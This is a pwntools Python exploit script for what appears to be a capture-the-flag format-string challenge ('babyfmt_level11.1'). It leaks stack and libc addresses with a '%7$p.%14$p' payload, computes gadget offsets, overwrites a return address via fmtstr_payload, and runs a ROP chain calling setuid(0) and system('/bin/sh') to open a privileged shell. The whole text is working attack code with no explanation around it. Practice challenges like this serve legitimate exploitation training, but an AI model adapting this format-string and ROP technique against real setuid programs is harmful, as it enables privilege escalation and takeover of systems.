from pwn import *
context.binary = "/challenge/babyfmt_level11.1"
context.terminal = ['tmux','splitw','-h']
p = process()
#p = gdb.debug("/challenge/babyfmt_level11.1")
payload1 = bytes('%7$p.%14$p','utf-8')
p.sendline(payload1)
p.recvuntil(b'Your input is:')
p.recvline()
leak = p.recvline().strip(b'\n').decode().split('.')
log.info("Leak: %s", leak)
libc_base = int(leak[1],base=16) - 0x1db9c1
overwrite = int(leak[0],base=16) - 0x6b
log.info("Libc base: %s", hex(libc_base))
log.info("Place to overwrite: %s", hex(overwrite))
add_rsp = libc_base + 0x21021
pop_rdi = libc_base + 0x1b6a
setuid = libc_base + 0xc2150
bin_sh = libc_base + 0x1925bd
system = libc_base + 0x30290
time.sleep(0.3)
payload2 = b'A'*5 + fmtstr_payload(19,{overwrite:add_rsp},24) + cyclic(0x40)
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(bin_sh) + p64(system)
#+ b'B'*16 + b'C'*16
p.sendline(payload2)
p.interactive()
#fmtstr_payload(18,{overwrite:add_rsp},19) + b'B'*16 + b'C'*16
#bytes('%10c%21$hhn'.ljust(21,'.'),'utf-8') + p64(overwrite)

